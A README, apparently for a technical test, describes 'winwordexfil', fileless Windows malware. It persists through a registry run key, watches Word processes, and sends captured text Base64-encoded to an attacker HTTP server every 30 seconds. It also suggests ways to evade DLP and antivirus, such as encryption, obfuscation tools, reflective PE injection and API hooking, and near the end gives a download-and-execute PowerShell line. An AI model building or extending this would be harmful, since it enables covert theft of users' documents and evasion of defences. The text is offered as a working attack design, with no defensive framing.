# winwordexfil

Novartis technical test

Write code for Windows 10 that:

    - Is persistent (survives reboots).
    - It is as file-less as possible (should leave a minimal amount of code on disk, for as little time as possible).
    - Requires as little privileges as possible.
    - Searches for Word processes and extracts all text written (both for already open documents and for new Word instances).
    - Send the gathered data to a server.
    
 


cuando dropeas: haces persistencia, lanzas watcher

haces persistencia (a nivel usuario) que es una entrada en el registro para que se ejecute al inicio de sesión 

pendiente -> watcher para ver cuando se abre el world

exfiltrar el contenido de los documentos abiertos --> basic dlp evasion encoding in base64. more advanced techniques like adding cypher.

https://community.spiceworks.com/how_to/163884-getting-data-from-a-word-document-using-powershell

https://medium.com/@riffsandhacks/data-exfiltration-bypassing-a-misconfigured-dlp-to-exfiltrate-sensitive-data-1236989c76c1

https://stackoverflow.com/questions/52074362/how-to-connect-powershell-script-to-an-already-opened-document




## Exfiltration http server

A simple python http server has been developed serving the payload for the fileless attack implementing GET method and receiving the exfiltration data through POST requests. The main code for the implementation comes from following link with the addition of other functionalities like serving files and creating files with decoded exfiltrated data.
<https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7>

During the first execution (infection) or when the computer is rebooted the payload is loaded from the server into memory executing it.

![](./img/get-request.png)

When the software fins that WinWord process starts, it send each 30 seconds the list of words to the server by a POST request encoding data y Base64. The server receives those data and created a file into disk with decoded data.

![](./img/post-request.png)

![](./img/server-file.png)

![](./img/open-file.png)

## Enhancements

It is necessary to mention here that there are a huge number of features that can be added for AV bypassing and make more difficult possible forensics tasks

The software implements a basic bypass of possible DLP protections the exfiltrated data is encoded in Base64 before sending to the server. A better approach can be cyphering the payload with dynamic keys encryption gotten from the server.

The PowerShell code is not obfuscated in any way making easier the comprehension of the reader. A useful tool to do that is for example <https://github.com/danielbohannon/Invoke-Obfuscation>





in order to create a better malware or wanted to use other techniques reflectivePEInjection can be used



IEX((New-Object System).DowloadString powershell infoKe-ReflectivePEInjection.ps1)
$b = downloadstring(executable.bin)
$c system.convert::frombase64string($b)
Invoke-ReflectivePEInjection -PEBytes $c   /indicanto el proceso al que quieres ir



process dll injection to hook windows api call 



Microsoft MSHTML Remote Code Execution Vulnerability